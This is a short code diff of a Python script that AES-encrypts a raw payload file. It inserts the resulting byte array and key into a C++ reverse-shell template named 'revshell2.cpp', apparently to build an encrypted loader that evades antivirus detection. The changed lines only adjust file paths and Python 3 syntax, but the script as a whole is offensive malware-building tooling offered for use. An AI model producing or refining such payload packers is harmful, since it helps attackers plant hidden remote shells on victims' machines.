@@ -19,10 +19,10 @@ def aesenc(plaintext, key):
 
 
 
-try:
-    plaintext = open(sys.argv[1], "r").read()
+try:  
+    plaintext = open(sys.argv[1], "rb").read()
 except:
-    print("File argument needed! %s <raw payload file>" % sys.argv[0])
+    print(("File argument needed! %s <raw payload file>" % sys.argv[0]))
     sys.exit()
 
 
@@ -33,19 +33,19 @@ payload = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
 
 
 
-f = open("code/revshell2.cpp", "r")
+f = open("revshell2.cpp", "r")
 
-with open('code/revshell2.cpp', 'r') as file :
+with open('revshell2.cpp', 'r') as file :
   filedata = file.read()
 
 filedata = filedata.replace('payloadaes', payload)
 
-with open('code/revshell2.cpp', 'w') as file:
+with open('revshell2.cpp', 'w') as file:
   file.write(filedata)
 
-f = open("code/revshell2.cpp", "r")
+f = open("revshell2.cpp", "r")
 
 filedata = filedata.replace('KEYAES', key)
 
-with open('code/revshell2.cpp', 'w') as file:
+with open('revshell2.cpp', 'w') as file:
   file.write(filedata)
